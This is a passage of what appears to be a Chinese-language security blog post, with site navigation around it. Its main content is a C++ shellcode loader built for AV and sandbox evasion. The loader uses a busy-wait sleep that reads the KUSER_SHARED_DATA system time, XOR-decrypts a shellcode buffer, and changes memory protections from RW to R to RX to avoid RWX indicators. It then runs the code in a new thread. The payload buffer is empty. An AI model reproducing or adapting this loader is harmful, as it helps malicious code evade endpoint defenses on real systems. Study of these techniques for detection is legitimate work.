+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html">https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://shubakki.github.io/posts/2022/12/detecting-and-evading-sandboxing-through-time-based-evasion/">https://shubakki.github.io/posts/2022/12/detecting-and-evading-sandboxing-through-time-based-evasion/</a></p>
+<p>change memory perms like RW -&gt; R -&gt; RX </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;snorlax.h&quot;</span> <span class="comment">// Header file containing our time based evasion stuff</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;utils.h&quot;</span> <span class="comment">// Header file containing RNG related stuff.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERVAL rand() % 26 <span class="comment">// Edit as you wish</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MS_PER_SECOND 1000 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SLEEPTIME INTERVAL*MS_PER_SECOND <span class="comment">// Make the use easier</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">size_t</span> TICKS_PER_MILLISECOND = <span class="number">10000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="keyword">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __alt_sleepms(<span class="keyword">size_t</span> ms)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">size_t</span> x = rand(); <span class="comment">// random buffer var </span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> end = __get_timestamp() + ms; <span class="comment">// calculate when we shall stop sleeping</span></span><br><span class="line">	<span class="keyword">while</span> (__get_timestamp() &lt; end) &#123; x += <span class="number">1</span>; &#125; <span class="comment">// increment random var by 1 till we reach our endtime</span></span><br><span class="line">	<span class="keyword">if</span> (__get_timestamp() - end &gt; <span class="number">2000</span>) <span class="keyword">return</span>; <span class="comment">// Fast Forward check, might need some tuning	</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// seed our generator </span></span><br><span class="line">    <span class="comment">// defaultseed could be any seed you choose</span></span><br><span class="line">    <span class="comment">//but for obvious reasons i recommend using the __TIME__ macro for that.</span></span><br><span class="line">    srand( defaultseed ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// initial timeout ? (could be extremely sus)</span></span><br><span class="line">    __alt_sleepms( SLEEPTIME * <span class="number">12</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// decrypt our xor encrypted shellcode</span></span><br><span class="line">    xor_bytes( buf, SHELLCODE_SIZE, key, KEYLEN );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate RW memory</span></span><br><span class="line">    PVOID addr = VirtualAlloc( <span class="literal">NULL</span>, <span class="keyword">sizeof</span>( buf ), ( MEM_RESERVE | MEM_COMMIT ), PAGE_READWRITE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy our shellcode to the allocated memory</span></span><br><span class="line">    <span class="built_in">memcpy</span>( addr, buf, <span class="keyword">sizeof</span>( buf ) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now the interesting part where we can leverage sleeping</span></span><br><span class="line">    <span class="comment">// We basically change memory perms like RW -&gt; R -&gt; RX </span></span><br><span class="line">    <span class="comment">// RWX memory can appear as an IOC</span></span><br><span class="line">    DWORD old_protect;</span><br><span class="line">    VirtualProtect( addr, <span class="keyword">sizeof</span>( buf ), PAGE_READONLY, &amp;old_protect );</span><br><span class="line"></span><br><span class="line">    __alt_sleepms( SLEEPTIME );</span><br><span class="line"></span><br><span class="line">    VirtualProtect( addr, <span class="keyword">sizeof</span>( buf ), PAGE_EXECUTE_READ, &amp;oldProtect );</span><br><span class="line"></span><br><span class="line">    __alt_sleepms( SLEEPTIME );</span><br><span class="line"></span><br><span class="line">    DWORD id;</span><br><span class="line">    HANDLE thread = CreateThread( <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;id );</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject( thread, INFINITE );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/bfeb5984/" rel="prev" title="nodejs下vm2沙箱逃逸">
+      <i class="fa fa-chevron-left"></i> nodejs下vm2沙箱逃逸
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/c91c8eaa/" rel="next" title="geacon_pro使用">
+      geacon_pro使用 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#KUSER-SHARED-DATA%E7%BB%93%E6%9E%84"><span class="nav-number">2.1.</span> <span class="nav-text">_KUSER_SHARED_DATA结构</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SystemTime%E5%B1%9E%E6%80%A7"><span class="nav-number">2.1.1.</span> <span class="nav-text">SystemTime属性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mamor"
+      src="/images/kabi.jpg">
+  <p class="site-author-name" itemprop="name">Mamor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">159</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Mamor5409" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Mamor5409" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.yuque.com/mamor" title="Yuque → https:&#x2F;&#x2F;www.yuque.com&#x2F;mamor" rel="noopener" target="_blank"><i class="yuque fa-fw"></i>Yuque</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mamor</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">736k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:09</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<!--
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共185.4k字</span>
+</div>
+-->
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/ClickShowText.js"></script>
+
+<script type="text/javascript">
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+</html>
+
